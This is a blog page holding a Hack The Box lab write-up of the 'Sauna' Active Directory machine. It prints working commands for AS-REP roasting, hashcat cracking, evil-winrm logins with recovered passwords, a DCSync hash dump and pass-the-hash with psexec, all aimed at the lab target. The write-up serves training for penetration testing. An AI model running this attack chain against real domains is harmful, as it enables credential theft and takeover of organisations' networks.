<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Sauna | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Learn basic exploitation of Active Directory"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/sauna/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Sauna"><meta property="og:description" content="Learn basic exploitation of Active Directory"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/sauna/"><meta property="og:image" content="https://fahmifj.github.io/imgs/image-20210408043340395.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-04-07T12:02:54+07:00"><meta property="article:modified_time" content="2021-04-07T12:02:54+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/imgs/image-20210408043340395.png"><meta name=twitter:title content="HackTheBox - Sauna"><meta name=twitter:description content="Learn basic exploitation of Active Directory"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Sauna","item":"https://fahmifj.github.io/hackthebox/sauna/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Sauna","name":"HackTheBox - Sauna","description":"Learn basic exploitation of Active Directory","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.\nSauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack to obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user’s password. With the obtained password, I’m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I’m able to gain an interactive shell access as NT Authority\\System.\nSkills Learned Generating potential usernames AS-Rep roasting BloodHound Tools Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket BloodHound - https://github.com/BloodHoundAD/BloodHound Reconnaissance Nmap Port scanning is the first thing I’d do.\n→ root@iamf «sauna» «192.168.2.103» $ nmap -sV -sC -oA nmap/sauna '10.10.10.175' ... ... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-22 00:45:32Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/21%Time=5E9F315E%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\"); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m28s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-22T00:47:55 |_ start_date: N/A ... ... Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.\nnmap also identified Sauna’s domain name as EGOTISTICAL-BANK.LOCAL.\nActive Directory domain is similar to web domain both in concept and usage, but the realm is different. Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.\nEnumeration TCP 80 - Website Web Pages Overview These are some overview of the web pages.\nThe input vectors doesn’t seem injectable.\nGenerating Usernames These are the hints given by the author:\nThe first one is the word “roast” on the homepage and the contact page. This might refer to the AS-REP roasting attack.\nI got a loan and can't pay it back, I cant even get a ticket to roast my chestnuts! We will always try to never answer your quetsions - we're too busy roasting in the sauna, counting our money The second one is the word “only one”, this can be interpreted as only one of the users is vulnerable.\nMeet the team. So many bank account managers but only one security manager. Sounds about right! From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.\nBased on common/best practices of AD user naming conventions\n#!/usr/bin/python3 import sys def convert_name(userfile): f = open(userfile, 'r') for line in f.readlines(): data = \"\".join(line.split('\\n')) names = data.split(' ') first_letter = names[0][0] first_name = names[0] lastname = names[1] print(f'{first_name}.{lastname}') print(f'{first_letter}{lastname}') print(f'{first_letter}.{lastname}') print(f'{first_letter}a{lastname}') print(f'{first_letter}e{lastname}') if __name__ == '__main__' : try: namelist = sys.argv[1].strip() except IndexError: print(\"[-] Usage: ./convert-name.py listnames\") exit(-1) convert_name(namelist) Below are the generated usernames from the script.\n→ root@iamf «sauna» «192.168.2.103» $ python convert-name.py listnames Fergus.Smith FSmith F.Smith FaSmith FeSmith Shaun.Coins SCoins S.Coins SaCoins SeCoins Hugo.Bear HBear H.Bear HaBear HeBear Steven.Kerb SKerb S.Kerb SaKerb SeKerb Bowie.Taylor BTaylor B.Taylor BaTaylor BeTaylor Sophie.Driver SDriver S.Driver SaDriver SeDriver Foothold Shell as Fsmith AS-REP Roasting On Forest Write-up, I briefly explained about AS-REP Roasting.\nWith the generated usernames, AS-REP roasting attack can be performed using GetNPUsers.py from Impacket.\n→ root@iamf «sauna» «192.168.2.103» $ GetNPUsers.py -dc-ip '10.10.10.175' -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt It successfully obtained FSmith’s TGT.\nCracking TGT hashcat successfully cracked the TGT (performed on my Windows machine).\nC:\\tools\\hashcat6\u003ehashcat.exe -m 18200 '$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc' C:/tools/rockyou.txt ... ... $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23 Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc ... ... The password is Thestrokes23.\nRemote Access This user can login remotely with evil-winrm.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i '10.10.10.175' -u fsmith -p 'Thestrokes23' User flag is done here.\nPrivilege Escalation Shell as svc_loanmgr Enumeration WinPEAS discovered that svc_loanmanager has an autologon credential.\nBut based on rpcclient, it’s actually svc_loanmgr.\nThis account also can login remotely.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i '10.10.10.175' -u svc_loanmgr -p 'Moneymakestheworldgoround!' Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u003e Shell as SYSTEM Enumeration with BloodHound I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.\nI copied SharpHound.exe (the ingestor) to Sauna using evilwin-rm and ran it to start collecting data.\nevilwin-rm has capability to transfer files directly between my machine and the remote (Sauna). The keywords are download and upload.\nIt finished within a few seconds.\nI copied the collected data to my machine and loaded it to BloodHound with drag and drop.\nAfter trying a few of BloodHound’s prebuilt queries, BloodHound reveals that svc_loanmgr has GetChangesAll and GetChanges permissions on the domain.\nI can access the help section by right clicking the edge. So, GetChanges and GetChangesAll are in conjunction with DS-Replication-Get-Changes-All. This grants svc_loanmgr ability to perform the DCSync attack.\nThe “Abuse Info” section contains how to abuse these privileges using mimikatz\nCredential Dumping Since Windows Defender typically doesn’t get along with mimikatz, I use secretsdump.py to perform a DCSync attack just like I did on Forest.\n→ root@iamf «sauna» «192.168.2.103» $ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 -just-dc-ntlm Pass the hash - psexec.py Now I can use psexec.py to perform pass-the-hash using administrator hash to gain shell access as local system.\n→ root@iamf «sauna» «192.168.2.103» $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna ","wordCount":"1062","inLanguage":"en","image":"https://fahmifj.github.io/imgs/image-20210408043340395.png","datePublished":"2021-04-07T12:02:54+07:00","dateModified":"2021-04-07T12:02:54+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/sauna/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Sauna</h1><p class=post-description>Learn basic exploitation of Active Directory</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>April 07, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>5 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-fsmith aria-label="Shell as Fsmith">Shell as Fsmith</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-svc_loanmgr aria-label="Shell as svc_loanmgr">Shell as svc_loanmgr</a></li><li><a href=#shell-as-system aria-label="Shell as SYSTEM">Shell as SYSTEM</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/sauna/imgs/image-20210408043340395_hu77d37b1d2ec7f6d40758e5541e2d55e3_150241_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/sauna/imgs/image-20210408043340395_hu77d37b1d2ec7f6d40758e5541e2d55e3_150241_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/sauna/imgs/image-20210408043340395_hu77d37b1d2ec7f6d40758e5541e2d55e3_150241_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/sauna/imgs/image-20210408043340395.png 743w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/sauna/imgs/image-20210408043340395.png alt="Hack The Box - Sauna" width=743 height=473><p>HackTheBox - Sauna</p></figure><p>Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.</p><p>Sauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack to obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user&rsquo;s password. With the obtained password, I&rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I&rsquo;m able to gain an interactive shell access as NT Authority\System.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Generating potential usernames</li><li>AS-Rep roasting</li><li>BloodHound</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Kali Linux (Attacking Machine) - <a href=https://www.kali.org/>https://www.kali.org/</a></li><li>Nmap - Preinstalled in Kali Linux</li><li>Impacket - <a href=https://github.com/SecureAuthCorp/impacket>https://github.com/SecureAuthCorp/impacket</a></li><li>BloodHound - <a href=https://github.com/BloodHoundAD/BloodHound>https://github.com/BloodHoundAD/BloodHound</a></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>Port scanning is the first thing I&rsquo;d do.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ nmap -sV -sC -oA nmap/sauna <span class=s1>&#39;10.10.10.175&#39;</span>
</span></span><span class=line><span class=cl>... &lt;snip&gt; ...
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>53/tcp   open  domain?
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   DNSVersionBindReqTCP: 
</span></span><span class=line><span class=cl><span class=p>|</span>     version
</span></span><span class=line><span class=cl><span class=p>|</span>_    <span class=nb>bind</span>
</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Egotistical Bank :: Home
</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2020-04-22 00:45:32Z<span class=o>)</span>
</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp  open  tcpwrapped
</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>3269/tcp open  tcpwrapped
</span></span><span class=line><span class=cl><span class=m>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port53-TCP:V<span class=o>=</span>7.80%I<span class=o>=</span>7%D<span class=o>=</span>4/21%Time<span class=o>=</span>5E9F315E%P<span class=o>=</span>x86_64-pc-linux-gnu%r<span class=o>(</span>DNSV
</span></span><span class=line><span class=cl>SF:ersionBindReqTCP,20,<span class=s2>&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span></span></span><span class=line><span class=cl><span class=s2>SF:x04bind\0\0\x10\0\x03&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>Service Info: Host: SAUNA<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 6h59m28s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2020-04-22T00:47:55
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>... &lt;snip&gt; ...
</span></span></code></pre></div><p>Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.</p><p><code>nmap</code> also identified Sauna&rsquo;s domain name as <code>EGOTISTICAL-BANK.LOCAL</code>.</p><blockquote><p>Active Directory domain is similar to web domain both in concept and usage, but the realm is different. Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.</p></blockquote><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><h4 id=web-pages-overview>Web Pages Overview<a class=anchor aria-hidden=true href=#web-pages-overview>#</a></h4><p>These are some overview of the web pages.</p><p><div class=img-container><img src=imgs/image-20210407123719988.png alt=image-20210407123719988></div></p><p><div class=img-container><img src=imgs/image-20210407123908202.png alt=image-20210407123908202></div></p><p><div class=img-container><img src=imgs/image-20210407123842325.png alt=image-20210407123842325></div></p><p><div class=img-container><img src=imgs/image-20210407123656847.png alt=image-20210407123656847></div></p><p>The input vectors doesn&rsquo;t seem injectable.</p><h4 id=generating-usernames>Generating Usernames<a class=anchor aria-hidden=true href=#generating-usernames>#</a></h4><p>These are the hints given by the author:</p><p>The first one is the word &ldquo;roast&rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>I got a loan and can&#39;t pay it back, I cant even get a ticket to roast my chestnuts!
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>We will always try to never answer your quetsions - we&#39;re too busy roasting in the sauna, counting our money
</span></span></code></pre></div><p>The second one is the word &ldquo;only one&rdquo;, this can be interpreted as only one of the users is vulnerable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Meet the team. So many bank account managers but only one security manager. Sounds about right!
</span></span></code></pre></div><p>From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.</p><blockquote><p>Based on common/best practices of <a href=imgs/active-directory-user-naming-convention>AD user naming conventions</a></p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>convert_name</span><span class=p>(</span><span class=n>userfile</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>userfile</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=o>.</span><span class=n>readlines</span><span class=p>():</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>names</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>first_letter</span> <span class=o>=</span> <span class=n>names</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>first_name</span> <span class=o>=</span> <span class=n>names</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>lastname</span> <span class=o>=</span> <span class=n>names</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>first_name</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>lastname</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>first_letter</span><span class=si>}{</span><span class=n>lastname</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>first_letter</span><span class=si>}</span><span class=s1>.</span><span class=si>{</span><span class=n>lastname</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>first_letter</span><span class=si>}</span><span class=s1>a</span><span class=si>{</span><span class=n>lastname</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;</span><span class=si>{</span><span class=n>first_letter</span><span class=si>}</span><span class=s1>e</span><span class=si>{</span><span class=n>lastname</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>namelist</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Usage: ./convert-name.py listnames&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>convert_name</span><span class=p>(</span><span class=n>namelist</span><span class=p>)</span>
</span></span></code></pre></div><p>Below are the generated usernames from the script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «sauna» «192.168.2.103»
</span></span><span class=line><span class=cl>$ python convert-name.py listnames
